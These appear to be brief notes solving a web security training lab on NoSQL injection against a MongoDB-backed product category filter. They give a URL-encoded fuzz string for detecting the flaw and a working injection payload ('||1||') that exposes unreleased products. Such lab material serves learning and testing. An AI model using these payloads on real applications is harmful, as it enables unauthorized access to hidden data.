```
Lab: Detecting NoSQL injection

APPRENTICE

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.
```

* Payload use to detect : `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`
* Payload to exploit the vuln : `category=Clothing%2c+shoes+and+accessories%27%7c%7c%31%7c%7c%27`
